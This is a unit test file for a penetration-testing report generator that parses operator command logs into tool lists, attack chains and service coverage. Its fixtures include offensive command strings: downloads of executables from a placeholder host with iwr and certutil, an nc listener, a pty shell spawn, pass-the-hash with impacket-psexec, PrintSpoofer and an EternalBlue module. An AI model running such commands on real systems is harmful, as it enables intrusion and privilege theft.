import { describe, expect, it } from "vitest";
import { attackChain, exploitedSystems, msfModules, serviceCoverage, testedNotExploited, toolsUsed } from "../engines/report";
import type { ReportData } from "../engines/report";
import type { Host } from "../types/host";
import type { LogEntry } from "../types/log";

const H = "h1";
const svc = (port: number, extra = {}) => ({ id: `s${port}`, hostId: H, port, protocol: "tcp", nmapService: "http", nmapVersion: null, confirmedProduct: null, confirmedVersion: null, verdict: null, ...extra });
const attempt = (title: string, extra = {}) => ({ id: title, hostId: H, title, reasonKind: "control", private: false, ...extra });

function data(): ReportData {
  return {
    engagement: { id: "e1", domain: null },
    hosts: [{ id: H, name: "web01", ip: "10.0.0.5", access: "root" }, { id: "h2", name: "dc01", ip: null, access: "none" }],
    services: [
      svc(80, { confirmedProduct: "Apache", confirmedVersion: "2.4" }),
      svc(22),
      svc(445),
      svc(3389),
    ],
    findings: [{ id: "f1", title: "RCE in app", hostIds: [H], serviceIds: ["s80"] }],
    attempts: [
      attempt("SSH brute force on 22", { reason: "WAF drops it" }),
      attempt("scan 10.0.22.5 sweep", { reason: "" }),
            attempt("RDP spray 3389", { private: false, reasonKind: "operator" }),
    ],
    ruledOut: [],
    grants: [],
    hops: [],
    log: [],
  } as unknown as ReportData;
}

describe("serviceCoverage", () => {
  it("classifies exploited, tested and untested", () => {
    const rows = serviceCoverage(data(), H, {});
    const by = (p: number) => rows.find((r) => r.port === p)!;
    expect(by(80)).toMatchObject({ result: "exploited", via: "RCE in app", product: "Apache 2.4", proven: true });
    expect(by(22)).toMatchObject({ result: "tested", via: "SSH brute force on 22", proven: false, product: "http" });
    expect(by(445).result).toBe("untested");
    expect(by(3389).result).toBe("untested"); // operator attempt never counts
    expect(by(445).via).toBeNull();
  });
  it("treats a dead-end verdict as tested and lets an override win", () => {
    const d = data();
    d.services[2] = svc(445, { verdict: "dead_end" }) as never;
    const rows = serviceCoverage(d, H, { s22: { result: "untested", note: "note!" } });
    expect(rows.find((r) => r.port === 445)?.result).toBe("tested");
    expect(rows.find((r) => r.port === 22)).toMatchObject({ result: "untested", via: "note!" });
  });
});

describe("testedNotExploited", () => {
  it("excludes private attempts and words the reason", () => {
    const d = data();
    d.ruledOut = [{ id: "r", hostId: H, text: "FTP anon", reason: "disabled", private: false }] as never;
    expect(testedNotExploited(d, H)).toEqual([
      { title: "SSH brute force on 22", reason: "blocked by a control: WAF drops it" },
      { title: "scan 10.0.22.5 sweep", reason: "blocked by a control" },
      { title: "FTP anon", reason: "disabled" },
    ]);
    expect(testedNotExploited(d, null)).toEqual([]);

  });
});

describe("exploitedSystems", () => {
  it("prefers the section method over the finding title", () => {
    const t = [{ key: H, kind: "standalone" as const, hostIds: [H] }];
    expect(exploitedSystems(data(), t, {})[0]).toMatchObject({ name: "web01", access: "root", method: "RCE in app" });
    expect(exploitedSystems(data(), t, { [H]: { method: "Manual" } })[0].method).toBe("Manual");
  });
  it("words full access as SYSTEM on Windows and root elsewhere", () => {
    const d = data();
    d.hosts = [{ id: H, name: "web01", ip: "10.0.0.5", access: "root", os: "windows" }] as never;
    const t = [{ key: H, kind: "standalone" as const, hostIds: [H] }];
    expect(exploitedSystems(d, t, {})[0].access).toBe("SYSTEM");
  });
  it("lists only hosts where access was gained", () => {
    const t = [{ key: "ad-set", kind: "ad-set" as const, hostIds: [H, "h2"] }];
    expect(exploitedSystems(data(), t, {}).map((r) => r.name)).toEqual(["web01"]);
  });
});

describe("attackChain", () => {
  it("orders hops and admin grants by time", () => {
    const d = data();
    d.hops = [{ fromHostId: H, toHostId: "h2", via: "psexec", logEntryId: "l1", at: 20 }] as never;
    d.grants = [
      { hostId: "h2", level: "system", via: "dcsync", logEntryId: "l2", at: 30 },
      { hostId: "h2", level: "user", via: "x", logEntryId: null, at: 10 },
    ] as never;
    expect(attackChain(d, ["h2"]).map((s) => s.via)).toEqual(["psexec", "dcsync"]);
  });
  it("lists a hop once when the same step also granted SYSTEM on the host it reached", () => {
    const d = data();
    d.hops = [{ fromHostId: H, toHostId: "h2", via: "Pass the hash (psexec)", logEntryId: "l1", at: 20 }] as never;
    d.grants = [{ hostId: "h2", level: "system", via: "Pass the hash (psexec)", logEntryId: "l1", at: 20 }] as never;
    expect(attackChain(d, ["h2"])).toEqual([{ from: H, to: "h2", via: "Pass the hash (psexec)", entryId: "l1" }]);
  });
});

const entry = (id: string, command: string, extra: Partial<LogEntry> = {}) =>
  ({ id, kind: "command", hostIds: [H], private: false, content: { kind: "command", blocks: [{ command, output: "" }] }, ...extra }) as LogEntry;

describe("toolsUsed", () => {
  it("lists each tool once with its purpose and URL, skipping sudo and private entries", () => {
    const log = [
      entry("a", "nmap -sV 10.0.0.5"),
      entry("b", "sudo nmap -p- 10.0.0.5\nFOO=1 gobuster dir"),
      entry("c", "hydra x", { private: true }),
    ];
    expect(toolsUsed(log, [H])).toEqual([
      { tool: "gobuster", purpose: "Web content discovery", url: "https://github.com/OJ/gobuster" },
      { tool: "nmap", purpose: "Port and service scanning", url: "https://nmap.org" },
    ]);
  });
  it("leaves out shell builtins and coreutils, including sudo -l and every segment of a chain", () => {
    const log = [
      entry("a", "whoami /priv\ntype C:\\x.txt\ncd /tmp && ls -la\ncat /etc/passwd | grep root\nsudo -l\nsudo tar -cf x y\nchmod 600 k && ssh -i k dev@10.0.0.5"),
      entry("b", "iwr http://x/a.exe -OutFile a.exe\nInvoke-WebRequest http://x/b\necho hi\ncp a b\nmv a b\ndir"),
      entry("c", "certutil -urlcache -f http://x/a.exe a.exe"),
    ];
    expect(toolsUsed(log, [H]).map((r) => [r.tool, r.purpose])).toEqual([
      ["certutil", "File transfer"],
      ["ssh", "Remote shell over SSH"],
    ]);
  });
  it("names a tool's family once (winPEAS, PrintSpoofer, impacket) and keeps unknown tools with blank purpose", () => {
    const log = [
      entry("a", ".\\winPEASx64.exe quiet\nC:\\Windows\\Tasks\\PrintSpoofer64.exe -i -c cmd\nPrintSpoofer.exe -i"),
      entry("b", "impacket-psexec a@b -hashes :x\nimpacket-GetUserSPNs a/b -request\nrlwrap nc -lvnp 443\nmytool --go"),
    ];
    expect(toolsUsed(log, [H]).map((r) => r.tool)).toEqual([
      "impacket-GetUserSPNs",
      "impacket-psexec",
      "mytool",
      "nc",
      "PrintSpoofer",
      "rlwrap",
      "winPEAS",
    ]);
    expect(toolsUsed(log, [H]).find((r) => r.tool === "mytool")).toEqual({ tool: "mytool", purpose: "", url: "" });
  });
  it("counts python3 only when it runs a .py file, as the exploit runner", () => {
    expect(toolsUsed([entry("a", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -m http.server 80")], [H])).toEqual([]);
    expect(toolsUsed([entry("a", "python3 46153.py -u admin -i http://x")], [H]).map((r) => [r.tool, r.purpose])).toEqual([["python3", "Exploit runner"]]);
  });
  it("leaves out entries an operator or private attempt points at, and applies per-row overrides", () => {
    const log = [entry("a", "PrintSpoofer32.exe -i"), entry("b", "hydra -l sa x")];
    const attempts = [{ id: "t", hostId: H, reasonKind: "operator", private: true, logEntryId: "a" }] as never;
    expect(toolsUsed(log, [H], { attempts, overrides: { hydra: { purpose: "MSSQL password guessing" } } })).toEqual([
      { tool: "hydra", purpose: "MSSQL password guessing", url: "https://github.com/vanhauser-thc/thc-hydra" },
    ]);
  });
  it("has no banned tools in its catalog", () => {
    expect(toolsUsed([entry("a", "sqlmap -u x\nnessus\nopenvas")], [H]).every((r) => r.purpose === "")).toBe(true);
  });
});

describe("msfModules", () => {
  it("lists modules and ignores multi/handler", () => {
    const hosts = [{ id: H, name: "web01", ip: "10.0.0.5" }] as Host[];
    const log = [
      entry("m", "msfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.5"),
      entry("n", "use exploit/multi/handler"),
    ];
    expect(msfModules(log, { id: "e1", domain: null } as never, hosts)).toEqual([
      { hostId: H, module: "exploit/windows/smb/ms17_010_eternalblue" },
    ]);
  });
});

describe("serviceCoverage from access", () => {
  const cmdEntry = (id: string, command: string, extra: Partial<LogEntry> = {}) =>
    ({ id, kind: "command", hostIds: [H], private: false, title: "step", content: { kind: "command", blocks: [{ command, output: "x" }] }, ...extra }) as LogEntry;
  const base = () => {
    const d = data();
    d.findings = [];
    d.attempts = [];
    d.services = [
      svc(22, { nmapService: "ssh" }),
      svc(445, { nmapService: "microsoft-ds" }),
      svc(5985, { nmapService: "http" }),
      svc(8080, { nmapService: "http" }),
    ] as never;
    return d;
  };
  const by = (d: ReportData, p: number) => serviceCoverage(d, H, {}).find((r) => r.port === p)!;

  it("reads a grant's linked entry: evil-winrm is 5985, ssh is 22", () => {
    const d = base();
    d.log = [cmdEntry("l1", "evil-winrm -i 10.0.0.5 -u j -p x"), cmdEntry("l2", "chmod 600 k && ssh -i k dev@10.0.0.5")];
    d.grants = [
      { hostId: H, level: "user", via: "Provided credentials", logEntryId: "l1", at: 1 },
      { hostId: H, level: "user", via: "Key login", logEntryId: "l2", at: 2 },
    ] as never;
    expect(by(d, 5985)).toMatchObject({ result: "exploited", via: "Provided credentials" });
    expect(by(d, 22)).toMatchObject({ result: "exploited", via: "Key login" });
    expect(by(d, 445).result).toBe("untested");
    // The same grant's entry names no web port: 8080 stays untested.
    expect(by(d, 8080).result).toBe("untested");
  });

  it("reads a hop's via (psexec is 445) and a port named outright", () => {
    const d = base();
    d.hops = [
      { fromHostId: "h2", toHostId: H, via: "Pass the hash (psexec)", logEntryId: null, at: 1 },
      { fromHostId: "h2", toHostId: H, via: "Tomcat manager on 8080", logEntryId: null, at: 2 },
    ] as never;
    expect(by(d, 445)).toMatchObject({ result: "exploited", via: "Pass the hash (psexec)" });
    expect(by(d, 8080)).toMatchObject({ result: "exploited", via: "Tomcat manager on 8080" });
  });

  it("ignores a private linked entry, other hosts' grants, and lets a finding and an override win", () => {
    const d = base();
    d.log = [cmdEntry("l1", "ssh dev@10.0.0.5", { private: true })];
    d.grants = [
      { hostId: H, level: "user", via: "Shell", logEntryId: "l1", at: 1 },
      { hostId: "h2", level: "user", via: "ssh", logEntryId: null, at: 1 },
    ] as never;
    expect(by(d, 22).result).toBe("untested");
    d.grants = [{ hostId: H, level: "user", via: "ssh login", logEntryId: null, at: 1 }] as never;
    d.findings = [{ id: "f", title: "Weak SSH key", hostIds: [H], serviceIds: ["s22"] }] as never;
    expect(by(d, 22)).toMatchObject({ result: "exploited", via: "Weak SSH key" });
    expect(serviceCoverage(d, H, { s22: { result: "tested" } })[0].result).toBe("tested");
  });
});
